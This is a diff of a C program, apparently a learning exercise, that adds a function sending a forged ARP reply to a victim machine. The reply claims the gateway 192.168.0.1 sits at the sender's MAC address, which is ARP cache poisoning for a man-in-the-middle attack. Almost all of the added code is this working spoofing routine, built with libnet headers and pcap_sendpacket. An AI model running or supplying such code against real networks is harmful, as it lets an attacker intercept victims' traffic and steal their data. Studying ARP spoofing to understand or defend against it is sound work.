@@ -18,13 +18,19 @@ void usage(void){
 }
 
 void print_mac(char * mac);
-void get_victim_mac(char * mydev, 
+void get_victim_mac( 
 	char * victim_ip,char * victim_mac,
 	char * my_ip, char * my_mac);
 
+void send_fake_reply(
+	char * victim_ip,char * victim_mac,
+	char * src_ip, char * my_mac);
+
+char * mydev;
+pcap_t * handler;
+
 int main(int argc, char * argv[]){
 
-	char * mydev = 0;
 	char victim_mac[6] = {};
 
 	if (argc != 2) {
@@ -91,22 +97,69 @@ int main(int argc, char * argv[]){
 
 	
 	get_victim_mac(
-		mydev,
 		victim_ip,
 		victim_mac,
 		my_ip,
 		my_mac);
 
-	
-	
+	char gateway_ip[] = "192.168.0.1";
+	send_fake_reply(
+		victim_ip,
+		victim_mac,
+		gateway_ip,
+		my_mac);
+
 
 }
-void get_victim_mac(char * mydev, 
+
+void send_fake_reply(
 	char * victim_ip,char * victim_mac,
-	char * my_ip, char * my_mac){
+	char * src_ip, char * my_mac)
+{
+	struct libnet_ethernet_hdr * eth_hdr = 0;
+	char packet_s[PACKET_SIZE+1]={};
+	struct libnet_arp_hdr * arp_hdr;
+
+	putchar(10);
+	puts("Sending Fake ARP Reply...");
+
+	eth_hdr = (struct libnet_ethernet_hdr *)packet_s;
+
+	memcpy(eth_hdr->ether_dhost,victim_mac,6);
+	memcpy(eth_hdr->ether_shost,my_mac,6);
+	eth_hdr->ether_type = htons(ETHERTYPE_ARP);
+
+	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + 
+		sizeof(struct libnet_ethernet_hdr));
+
+	arp_hdr->ar_hrd = htons(ARPHRD_ETHER);
+	arp_hdr->ar_pro = htons(0x0800); //ipv4
+	arp_hdr->ar_hln = 6;
+	arp_hdr->ar_pln = 4;
+	arp_hdr->ar_op = htons(ARPOP_REPLY);
+
+	struct tmp_ip *ip_info = (struct tmp_ip *)((char *)arp_hdr + 
+		sizeof(struct libnet_arp_hdr));
+
+	memcpy(ip_info->sender_mac,my_mac,6);
+	inet_pton(AF_INET, src_ip, &ip_info->sender_ip);
+	memcpy(ip_info->target_mac,victim_mac,6);
+	inet_pton(AF_INET, victim_ip,&ip_info->target_ip);
+
+	if(pcap_sendpacket(handler,(const u_char *)packet_s,42)==-1){
+		puts("pcap_sendpacket Error!");
+		exit(1);
+	}
+
+	puts("Succefully sent Fake ARP Reply");
+}
+
+void get_victim_mac(
+	char * victim_ip,char * victim_mac,
+	char * my_ip, char * my_mac)
+{
 
 	struct libnet_ethernet_hdr * eth_hdr = 0;
-	pcap_t * handler;
 	char packet_s[PACKET_SIZE+1]={};
 	const unsigned char * packet_r=0;
 	struct libnet_arp_hdr * arp_hdr;
